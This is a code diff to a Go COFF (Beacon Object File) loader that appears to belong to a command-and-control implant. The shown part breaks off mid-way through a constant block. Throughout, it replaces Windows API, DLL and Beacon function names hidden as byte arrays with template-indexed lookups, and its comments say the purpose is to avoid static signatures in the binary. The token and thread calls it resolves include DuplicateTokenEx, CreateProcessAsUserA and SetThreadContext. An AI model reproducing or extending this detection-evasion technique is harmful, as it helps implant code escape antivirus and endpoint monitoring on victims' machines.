@@ -31,180 +31,559 @@ const (
 	IMAGE_SCN_MEM_EXECUTE  = 0x20000000
 )
 
-// COFF loader strings (constructed to avoid static signatures)
+// COFF loader strings - initialized from template lookup
+// Uses coffTpl() for template lookup to avoid static signatures in binary
 var (
+	// Template storage - initialized by SetCOFFTemplate
+	coffTemplate []string
+
 	// DLL names
-	coffDllKernel32 = string([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c}) // kernel32.dll
-	coffDllNtdll    = string([]byte{0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c})                   // ntdll.dll
-	coffDllUser32   = string([]byte{0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})             // user32.dll
-	coffDllWs2_32   = string([]byte{0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})             // ws2_32.dll
-	coffDllAdvapi32 = string([]byte{0x61, 0x64, 0x76, 0x61, 0x70, 0x69, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c}) // advapi32.dll
+	coffDllKernel32 string
+	coffDllNtdll    string
+	coffDllUser32   string
+	coffDllWs2_32   string
+	coffDllAdvapi32 string
 
 	// Prefixes/suffixes
-	coffPrefixImp  = string([]byte{0x5f, 0x5f, 0x69, 0x6d, 0x70, 0x5f}) // __imp_
-	coffSuffixDll  = string([]byte{0x2e, 0x64, 0x6c, 0x6c})             // .dll
-	coffPrefixUs   = string([]byte{0x5f})                               // _
-	coffSectionBss = string([]byte{0x2e, 0x62, 0x73, 0x73})             // .bss
+	coffPrefixImp  string
+	coffSuffixDll  string
+	coffPrefixUs   string
+	coffSectionBss string
 
 	// Kernel32 API names
-	coffApiFreeLibrary               = string([]byte{0x46, 0x72, 0x65, 0x65, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79})                                                                                     // FreeLibrary
-	coffApiLoadLibraryA              = string([]byte{0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41})                                                                               // LoadLibraryA
-	coffApiGetProcAddress            = string([]byte{0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73})                                                                   // GetProcAddress
-	coffApiGetModuleHandleA          = string([]byte{0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x41})                                                       // GetModuleHandleA
-	coffApiGetModuleFileNameA        = string([]byte{0x47, 0x65, 0x74, 0x4d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x4e, 0x61, 0x6d, 0x65, 0x41})                                           // GetModuleFileNameA
-	coffApiVirtualAlloc              = string([]byte{0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63})                                                                               // VirtualAlloc
-	coffApiVirtualFree               = string([]byte{0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x46, 0x72, 0x65, 0x65})                                                                                     // VirtualFree
-	coffApiVirtualProtect            = string([]byte{0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74})                                                                   // VirtualProtect
-	coffApiSetLastError              = string([]byte{0x53, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72})                                                                               // SetLastError
-	coffApiGetCurrentProcess         = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                 // GetCurrentProcess
-	coffApiGetProcessHeap            = string([]byte{0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x48, 0x65, 0x61, 0x70})                                                                   // GetProcessHeap
-	coffApiHeapAlloc                 = string([]byte{0x48, 0x65, 0x61, 0x70, 0x41, 0x6c, 0x6c, 0x6f, 0x63})                                                                                                 // HeapAlloc
-	coffApiHeapFree                  = string([]byte{0x48, 0x65, 0x61, 0x70, 0x46, 0x72, 0x65, 0x65})                                                                                                       // HeapFree
-	coffApiWideCharToMultiByte       = string([]byte{0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72, 0x54, 0x6f, 0x4d, 0x75, 0x6c, 0x74, 0x69, 0x42, 0x79, 0x74, 0x65})                                     // WideCharToMultiByte
-	coffApiGetCurrentThread          = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                       // GetCurrentThread
-	coffApiGetThreadContext          = string([]byte{0x47, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74})                                                       // GetThreadContext
-	coffApiSetThreadContext          = string([]byte{0x53, 0x65, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74})                                                       // SetThreadContext
-	coffApiSuspendThread             = string([]byte{0x53, 0x75, 0x73, 0x70, 0x65, 0x6e, 0x64, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                                         // SuspendThread
-	coffApiResumeThread              = string([]byte{0x52, 0x65, 0x73, 0x75, 0x6d, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                                               // ResumeThread
-	coffApiCreateThread              = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                                               // CreateThread
-	coffApiExitThread                = string([]byte{0x45, 0x78, 0x69, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                                                           // ExitThread
-	coffApiGetSystemTime             = string([]byte{0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x54, 0x69, 0x6d, 0x65})                                                                         // GetSystemTime
-	coffApiGetLocalTime              = string([]byte{0x47, 0x65, 0x74, 0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x54, 0x69, 0x6d, 0x65})                                                                               // GetLocalTime
-	coffApiGetFileAttributesA        = string([]byte{0x47, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x41})                                           // GetFileAttributesA
-	coffApiSetFileAttributesA        = string([]byte{0x53, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x41})                                           // SetFileAttributesA
-	coffApiCreateFileA               = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x41})                                                                                     // CreateFileA
-	coffApiReadFile                  = string([]byte{0x52, 0x65, 0x61, 0x64, 0x46, 0x69, 0x6c, 0x65})                                                                                                       // ReadFile
-	coffApiWriteFile                 = string([]byte{0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65})                                                                                                 // WriteFile
-	coffApiCloseHandle               = string([]byte{0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                                                     // CloseHandle
-	coffApiGetFileSize               = string([]byte{0x47, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x53, 0x69, 0x7a, 0x65})                                                                                     // GetFileSize
-	coffApiGetFileSizeEx             = string([]byte{0x47, 0x65, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x53, 0x69, 0x7a, 0x65, 0x45, 0x78})                                                                         // GetFileSizeEx
-	coffApiFileTimeToSystemTime      = string([]byte{0x46, 0x69, 0x6c, 0x65, 0x54, 0x69, 0x6d, 0x65, 0x54, 0x6f, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x54, 0x69, 0x6d, 0x65})                               // FileTimeToSystemTime
-	coffApiSystemTimeToTzSpecific    = string([]byte{0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x54, 0x69, 0x6d, 0x65, 0x54, 0x6f, 0x54, 0x7a, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x54, 0x69, 0x6d, 0x65}) // SystemTimeToTzSpecificLocalTime
-	coffApiFindFirstFileA            = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x46, 0x69, 0x72, 0x73, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x41})                                                                   // FindFirstFileA
-	coffApiFindNextFileA             = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x4e, 0x65, 0x78, 0x74, 0x46, 0x69, 0x6c, 0x65, 0x41})                                                                         // FindNextFileA
-	coffApiFindClose                 = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x43, 0x6c, 0x6f, 0x73, 0x65})                                                                                                 // FindClose
-	coffApiGetLastError              = string([]byte{0x47, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72})                                                                               // GetLastError
-	coffApiRtlCopyMemory             = string([]byte{0x52, 0x74, 0x6c, 0x43, 0x6f, 0x70, 0x79, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79})                                                                         // RtlCopyMemory
+	coffApiFreeLibrary            string
+	coffApiLoadLibraryA           string
+	coffApiGetProcAddress         string
+	coffApiGetModuleHandleA       string
+	coffApiGetModuleFileNameA     string
+	coffApiVirtualAlloc           string
+	coffApiVirtualFree            string
+	coffApiVirtualProtect         string
+	coffApiSetLastError           string
+	coffApiGetCurrentProcess      string
+	coffApiGetProcessHeap         string
+	coffApiHeapAlloc              string
+	coffApiHeapFree               string
+	coffApiWideCharToMultiByte    string
+	coffApiGetCurrentThread       string
+	coffApiGetThreadContext       string
+	coffApiSetThreadContext       string
+	coffApiSuspendThread          string
+	coffApiResumeThread           string
+	coffApiCreateThread           string
+	coffApiExitThread             string
+	coffApiGetSystemTime          string
+	coffApiGetLocalTime           string
+	coffApiGetFileAttributesA     string
+	coffApiSetFileAttributesA     string
+	coffApiCreateFileA            string
+	coffApiReadFile               string
+	coffApiWriteFile              string
+	coffApiCloseHandle            string
+	coffApiGetFileSize            string
+	coffApiGetFileSizeEx          string
+	coffApiFileTimeToSystemTime   string
+	coffApiSystemTimeToTzSpecific string
+	coffApiFindFirstFileA         string
+	coffApiFindNextFileA          string
+	coffApiFindClose              string
+	coffApiGetLastError           string
+	coffApiRtlCopyMemory          string
 
 	// MSVCRT/String functions
-	coffFnStrlen    = string([]byte{0x73, 0x74, 0x72, 0x6c, 0x65, 0x6e})                                     // strlen
-	coffFnStrcmp    = string([]byte{0x73, 0x74, 0x72, 0x63, 0x6d, 0x70})                                     // strcmp
-	coffFnStrncmp   = string([]byte{0x73, 0x74, 0x72, 0x6e, 0x63, 0x6d, 0x70})                               // strncmp
-	coffFnStricmp   = string([]byte{0x5f, 0x73, 0x74, 0x72, 0x69, 0x63, 0x6d, 0x70})                         // _stricmp
-	coffFnStrnicmp  = string([]byte{0x5f, 0x73, 0x74, 0x72, 0x6e, 0x69, 0x63, 0x6d, 0x70})                   // _strnicmp
-	coffFnStrcpy    = string([]byte{0x73, 0x74, 0x72, 0x63, 0x70, 0x79})                                     // strcpy
-	coffFnStrncpy   = string([]byte{0x73, 0x74, 0x72, 0x6e, 0x63, 0x70, 0x79})                               // strncpy
-	coffFnStrcat    = string([]byte{0x73, 0x74, 0x72, 0x63, 0x61, 0x74})                                     // strcat
-	coffFnStrncat   = string([]byte{0x73, 0x74, 0x72, 0x6e, 0x63, 0x61, 0x74})                               // strncat
-	coffFnStrstr    = string([]byte{0x73, 0x74, 0x72, 0x73, 0x74, 0x72})                                     // strstr
+	coffFnStrlen   string
+	coffFnStrcmp   string
+	coffFnStrncmp  string
+	coffFnStricmp  string
+	coffFnStrnicmp string
+	coffFnStrcpy   string
+	coffFnStrncpy  string
+	coffFnStrcat   string
+	coffFnStrncat  string
+	coffFnStrstr   string
 
 	// Memory functions
-	coffFnCalloc    = string([]byte{0x63, 0x61, 0x6c, 0x6c, 0x6f, 0x63})                                     // calloc
-	coffFnMalloc    = string([]byte{0x6d, 0x61, 0x6c, 0x6c, 0x6f, 0x63})                                     // malloc
-	coffFnFree      = string([]byte{0x66, 0x72, 0x65, 0x65})                                                 // free
-	coffFnRealloc   = string([]byte{0x72, 0x65, 0x61, 0x6c, 0x6c, 0x6f, 0x63})                               // realloc
-	coffFnMemcpy    = string([]byte{0x6d, 0x65, 0x6d, 0x63, 0x70, 0x79})                                     // memcpy
-	coffFnMemset    = string([]byte{0x6d, 0x65, 0x6d, 0x73, 0x65, 0x74})                                     // memset
-	coffFnMemmove   = string([]byte{0x6d, 0x65, 0x6d, 0x6d, 0x6f, 0x76, 0x65})                               // memmove
-	coffFnMemcmp    = string([]byte{0x6d, 0x65, 0x6d, 0x63, 0x6d, 0x70})                                     // memcmp
+	coffFnCalloc  string
+	coffFnMalloc  string
+	coffFnFree    string
+	coffFnRealloc string
+	coffFnMemcpy  string
+	coffFnMemset  string
+	coffFnMemmove string
+	coffFnMemcmp  string
 
 	// Printf functions
-	coffFnVsnprintf  = string([]byte{0x76, 0x73, 0x6e, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x66})                   // vsnprintf
-	coffFnVsnprintfU = string([]byte{0x5f, 0x76, 0x73, 0x6e, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x66})             // _vsnprintf
-	coffFnSprintf    = string([]byte{0x73, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x66})                               // sprintf
+	coffFnVsnprintf  string
+	coffFnVsnprintfU string
+	coffFnSprintf    string
 
 	// User32 functions
-	coffApiMessageBoxA        = string([]byte{0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x41})                               // MessageBoxA
-	coffApiMessageBoxW        = string([]byte{0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x57})                               // MessageBoxW
-	coffApiGetDesktopWindow   = string([]byte{0x47, 0x65, 0x74, 0x44, 0x65, 0x73, 0x6b, 0x74, 0x6f, 0x70, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77}) // GetDesktopWindow
-	coffApiGetForegroundWnd   = string([]byte{0x47, 0x65, 0x74, 0x46, 0x6f, 0x72, 0x65, 0x67, 0x72, 0x6f, 0x75, 0x6e, 0x64, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77}) // GetForegroundWindow
-	coffApiGetWindowTextA     = string([]byte{0x47, 0x65, 0x74, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x54, 0x65, 0x78, 0x74, 0x41})             // GetWindowTextA
-	coffApiGetWindowTextW     = string([]byte{0x47, 0x65, 0x74, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x54, 0x65, 0x78, 0x74, 0x57})             // GetWindowTextW
-	coffApiFindWindowA        = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x41})                               // FindWindowA
-	coffApiFindWindowW        = string([]byte{0x46, 0x69, 0x6e, 0x64, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x57})                               // FindWindowW
+	coffApiMessageBoxA      string
+	coffApiMessageBoxW      string
+	coffApiGetDesktopWindow string
+	coffApiGetForegroundWnd string
+	coffApiGetWindowTextA   string
+	coffApiGetWindowTextW   string
+	coffApiFindWindowA      string
+	coffApiFindWindowW      string
 
 	// WS2_32 functions
-	coffApiWSAStartup     = string([]byte{0x57, 0x53, 0x41, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70})                         // WSAStartup
-	coffApiWSACleanup     = string([]byte{0x57, 0x53, 0x41, 0x43, 0x6c, 0x65, 0x61, 0x6e, 0x75, 0x70})                         // WSACleanup
-	coffApiWSAGetLastErr  = string([]byte{0x57, 0x53, 0x41, 0x47, 0x65, 0x74, 0x4c, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6f, 0x72}) // WSAGetLastError
-	coffApiSocket         = string([]byte{0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74})                                                 // socket
-	coffApiClosesocket    = string([]byte{0x63, 0x6c, 0x6f, 0x73, 0x65, 0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74})                   // closesocket
-	coffApiBind           = string([]byte{0x62, 0x69, 0x6e, 0x64})                                                             // bind
-	coffApiListen         = string([]byte{0x6c, 0x69, 0x73, 0x74, 0x65, 0x6e})                                                 // listen
-	coffApiAccept         = string([]byte{0x61, 0x63, 0x63, 0x65, 0x70, 0x74})                                                 // accept
-	coffApiConnect        = string([]byte{0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74})                                           // connect
-	coffApiSend           = string([]byte{0x73, 0x65, 0x6e, 0x64})                                                             // send
-	coffApiRecv           = string([]byte{0x72, 0x65, 0x63, 0x76})                                                             // recv
-	coffApiSendto         = string([]byte{0x73, 0x65, 0x6e, 0x64, 0x74, 0x6f})                                                 // sendto
-	coffApiRecvfrom       = string([]byte{0x72, 0x65, 0x63, 0x76, 0x66, 0x72, 0x6f, 0x6d})                                     // recvfrom
-	coffApiSelect         = string([]byte{0x73, 0x65, 0x6c, 0x65, 0x63, 0x74})                                                 // select
-	coffApiGethostbyname  = string([]byte{0x67, 0x65, 0x74, 0x68, 0x6f, 0x73, 0x74, 0x62, 0x79, 0x6e, 0x61, 0x6d, 0x65})       // gethostbyname
-	coffApiGethostbyaddr  = string([]byte{0x67, 0x65, 0x74, 0x68, 0x6f, 0x73, 0x74, 0x62, 0x79, 0x61, 0x64, 0x64, 0x72})       // gethostbyaddr
-	coffApiInet_addr      = string([]byte{0x69, 0x6e, 0x65, 0x74, 0x5f, 0x61, 0x64, 0x64, 0x72})                               // inet_addr
-	coffApiInet_ntoa      = string([]byte{0x69, 0x6e, 0x65, 0x74, 0x5f, 0x6e, 0x74, 0x6f, 0x61})                               // inet_ntoa
-	coffApiHtons          = string([]byte{0x68, 0x74, 0x6f, 0x6e, 0x73})                                                       // htons
-	coffApiHtonl          = string([]byte{0x68, 0x74, 0x6f, 0x6e, 0x6c})                                                       // htonl
-	coffApiNtohs          = string([]byte{0x6e, 0x74, 0x6f, 0x68, 0x73})                                                       // ntohs
-	coffApiNtohl          = string([]byte{0x6e, 0x74, 0x6f, 0x68, 0x6c})                                                       // ntohl
+	coffApiWSAStartup    string
+	coffApiWSACleanup    string
+	coffApiWSAGetLastErr string
+	coffApiSocket        string
+	coffApiClosesocket   string
+	coffApiBind          string
+	coffApiListen        string
+	coffApiAccept        string
+	coffApiConnect       string
+	coffApiSend          string
+	coffApiRecv          string
+	coffApiSendto        string
+	coffApiRecvfrom      string
+	coffApiSelect        string
+	coffApiGethostbyname string
+	coffApiGethostbyaddr string
+	coffApiInet_addr     string
+	coffApiInet_ntoa     string
+	coffApiHtons         string
+	coffApiHtonl         string
+	coffApiNtohs         string
+	coffApiNtohl         string
 
 	// Advapi32 functions
-	coffApiRegOpenKeyExA       = string([]byte{0x52, 0x65, 0x67, 0x4f, 0x70, 0x65, 0x6e, 0x4b, 0x65, 0x79, 0x45, 0x78, 0x41})                               // RegOpenKeyExA
-	coffApiRegCloseKey         = string([]byte{0x52, 0x65, 0x67, 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x4b, 0x65, 0x79})                                           // RegCloseKey
-	coffApiRegQueryValueExA    = string([]byte{0x52, 0x65, 0x67, 0x51, 0x75, 0x65, 0x72, 0x79, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x45, 0x78, 0x41})             // RegQueryValueExA
-	coffApiRegSetValueExA      = string([]byte{0x52, 0x65, 0x67, 0x53, 0x65, 0x74, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x45, 0x78, 0x41})                         // RegSetValueExA
-	coffApiOpenProcessToken    = string([]byte{0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x54, 0x6f, 0x6b, 0x65, 0x6e})             // OpenProcessToken
-	coffApiGetTokenInformation = string([]byte{0x47, 0x65, 0x74, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e}) // GetTokenInformation
-	coffApiSetTokenInformation = string([]byte{0x53, 0x65, 0x74, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e}) // SetTokenInformation
-	coffApiDuplicateTokenEx    = string([]byte{0x44, 0x75, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x45, 0x78})             // DuplicateTokenEx
-	coffApiCreateProcessAsUserA = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x41, 0x73, 0x55, 0x73, 0x65, 0x72, 0x41}) // CreateProcessAsUserA
+	coffApiRegOpenKeyExA        string
+	coffApiRegCloseKey          string
+	coffApiRegQueryValueExA     string
+	coffApiRegSetValueExA       string
+	coffApiOpenProcessToken     string
+	coffApiGetTokenInformation  string
+	coffApiSetTokenInformation  string
+	coffApiDuplicateTokenEx     string
+	coffApiCreateProcessAsUserA string
 
 	// Beacon API functions
-	coffFnBeaconOutput        = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x4f, 0x75, 0x74, 0x70, 0x75, 0x74})                                     // BeaconOutput
-	coffFnBeaconDataParse     = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x50, 0x61, 0x72, 0x73, 0x65})                   // BeaconDataParse
-	coffFnBeaconDataInt       = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x49, 0x6e, 0x74})                               // BeaconDataInt
-	coffFnBeaconDataShort     = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x53, 0x68, 0x6f, 0x72, 0x74})                   // BeaconDataShort
-	coffFnBeaconDataLength    = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x4c, 0x65, 0x6e, 0x67, 0x74, 0x68})             // BeaconDataLength
-	coffFnBeaconDataExtract   = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x44, 0x61, 0x74, 0x61, 0x45, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74})       // BeaconDataExtract
-	coffFnBeaconPrintf        = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x50, 0x72, 0x69, 0x6e, 0x74, 0x66})                                     // BeaconPrintf
-	coffFnBeaconFormatAlloc   = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x41, 0x6c, 0x6c, 0x6f, 0x63})       // BeaconFormatAlloc
-	coffFnBeaconFormatFree    = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x46, 0x72, 0x65, 0x65})             // BeaconFormatFree
-	coffFnBeaconFormatAppend  = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x41, 0x70, 0x70, 0x65, 0x6e, 0x64}) // BeaconFormatAppend
-	coffFnBeaconFormatPrintf  = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x50, 0x72, 0x69, 0x6e, 0x74, 0x66}) // BeaconFormatPrintf
-	coffFnBeaconFormatToStr   = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x54, 0x6f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67}) // BeaconFormatToString
-	coffFnBeaconFormatInt     = string([]byte{0x42, 0x65, 0x61, 0x63, 0x6f, 0x6e, 0x46, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x49, 0x6e, 0x74})                   // BeaconFormatInt
+	coffFnBeaconOutput       string
+	coffFnBeaconDataParse    string
+	coffFnBeaconDataInt      string
+	coffFnBeaconDataShort    string
+	coffFnBeaconDataLength   string
+	coffFnBeaconDataExtract  string
+	coffFnBeaconPrintf       string
+	coffFnBeaconFormatAlloc  string
+	coffFnBeaconFormatFree   string
+	coffFnBeaconFormatAppend string
+	coffFnBeaconFormatPrintf string
+	coffFnBeaconFormatToStr  string
+	coffFnBeaconFormatInt    string
 
 	// Helper functions
-	coffFnBofstart       = string([]byte{0x62, 0x6f, 0x66, 0x73, 0x74, 0x61, 0x72, 0x74})                                     // bofstart
-	coffFnInternalPrintf = string([]byte{0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x5f, 0x70, 0x72, 0x69, 0x6e, 0x74, 0x66}) // internal_printf
-	coffFnPrintoutput    = string([]byte{0x70, 0x72, 0x69, 0x6e, 0x74, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                   // printoutput
-	coffFnIntAlloc       = string([]byte{0x69, 0x6e, 0x74, 0x41, 0x6c, 0x6c, 0x6f, 0x63})                                     // intAlloc
-	coffFnIntFree        = string([]byte{0x69, 0x6e, 0x74, 0x46, 0x72, 0x65, 0x65})                                           // intFree
-	coffFnIntMemset      = string([]byte{0x69, 0x6e, 0x74, 0x4d, 0x65, 0x6d, 0x73, 0x65, 0x74})                               // intMemset
-	coffFnIntMemcpy      = string([]byte{0x69, 0x6e, 0x74, 0x4d, 0x65, 0x6d, 0x63, 0x70, 0x79})                               // intMemcpy
-	coffFnIntRealloc     = string([]byte{0x69, 0x6e, 0x74, 0x52, 0x65, 0x61, 0x6c, 0x6c, 0x6f, 0x63})                         // intRealloc
-	coffFnIntStrlen      = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x6c, 0x65, 0x6e})                               // intStrlen
-	coffFnIntStrcmp      = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x63, 0x6d, 0x70})                               // intStrcmp
-	coffFnIntStrncmp     = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x6e, 0x63, 0x6d, 0x70})                         // intStrncmp
-	coffFnIntStrcpy      = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x63, 0x70, 0x79})                               // intStrcpy
-	coffFnIntStrncpy     = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x6e, 0x63, 0x70, 0x79})                         // intStrncpy
-	coffFnIntStrcat      = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x63, 0x61, 0x74})                               // intStrcat
-	coffFnIntStrncat     = string([]byte{0x69, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x6e, 0x63, 0x61, 0x74})                         // intStrncat
-	coffFnToWideChar     = string([]byte{0x74, 0x6f, 0x57, 0x69, 0x64, 0x65, 0x43, 0x68, 0x61, 0x72})                         // toWideChar
-	coffFnUtf8ToUtf16    = string([]byte{0x55, 0x74, 0x66, 0x38, 0x54, 0x6f, 0x55, 0x74, 0x66, 0x31, 0x36})                   // Utf8ToUtf16
-	coffFnUtf16ToUtf8    = string([]byte{0x55, 0x74, 0x66, 0x31, 0x36, 0x54, 0x6f, 0x55, 0x74, 0x66, 0x38})                   // Utf16ToUtf8
+	coffFnBofstart       string
+	coffFnInternalPrintf string
+	coffFnPrintoutput    string
+	coffFnIntAlloc       string
+	coffFnIntFree        string
+	coffFnIntMemset      string
+	coffFnIntMemcpy      string
+	coffFnIntRealloc     string
+	coffFnIntStrlen      string
+	coffFnIntStrcmp      string
+	coffFnIntStrncmp     string
+	coffFnIntStrcpy      string
+	coffFnIntStrncpy     string
+	coffFnIntStrcat      string
+	coffFnIntStrncat     string
+	coffFnToWideChar     string
+	coffFnUtf8ToUtf16    string
+	coffFnUtf16ToUtf8    string
 )
 
+// Template indices for COFF loader strings (must match templates/common.go)
+const (
+	idxCoffDllKernel32 = 870
+	idxCoffDllNtdll    = 871
+	idxCoffDllUser32   = 872
+	idxCoffDllWs2_32   = 873
+	idxCoffDllAdvapi32 = 874
+
+	idxCoffPrefixImp  = 875
+	idxCoffSuffixDll  = 876
+	idxCoffPrefixUs   = 877
+	idxCoffSectionBss = 878
+
+	idxCoffApiFreeLibrary            = 880
+	idxCoffApiLoadLibraryA           = 881
+	idxCoffApiGetProcAddress         = 882
+	idxCoffApiGetModuleHandleA       = 883
+	idxCoffApiGetModuleFileNameA     = 884
+	idxCoffApiVirtualAlloc           = 885
+	idxCoffApiVirtualFree            = 886
+	idxCoffApiVirtualProtect         = 887
+	idxCoffApiSetLastError           = 888
+	idxCoffApiGetCurrentProcess      = 889
